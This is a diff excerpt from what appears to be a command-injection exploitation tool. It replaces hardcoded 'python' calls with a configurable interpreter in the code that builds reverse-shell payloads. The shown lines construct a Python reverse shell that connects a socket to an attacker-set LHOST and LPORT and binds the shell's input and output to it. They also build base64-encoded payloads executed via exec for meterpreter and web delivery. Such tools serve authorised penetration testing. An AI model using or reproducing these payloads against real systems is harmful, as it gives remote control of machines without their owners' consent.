@@ -323,7 +323,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 
     # Python-reverse-shell 
     elif other_shell == '4':
-      other_shell = "python -c 'import socket,subprocess,os%0d" \
+      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import socket,subprocess,os%0d" \
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                     "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
                     "os.dup2(s.fileno(),0)%0d" \
@@ -421,7 +421,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         set_python_working_dir()
         other_shell = settings.WIN_PYTHON_DIR + data
       else:
-        other_shell = "python" + data
+        other_shell = settings.LINUX_PYTHON_INTERPRETER + data
       break
 
     # Python-reverse-shell (meterpreter)
@@ -462,7 +462,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           set_python_working_dir()
           other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
         else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
         print(settings.SINGLE_WHITESPACE)
@@ -638,7 +638,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
               set_python_working_dir()
               other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
             else:
-              other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+              other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
             msf_launch_msg(output)
             break
           elif web_delivery == '2':
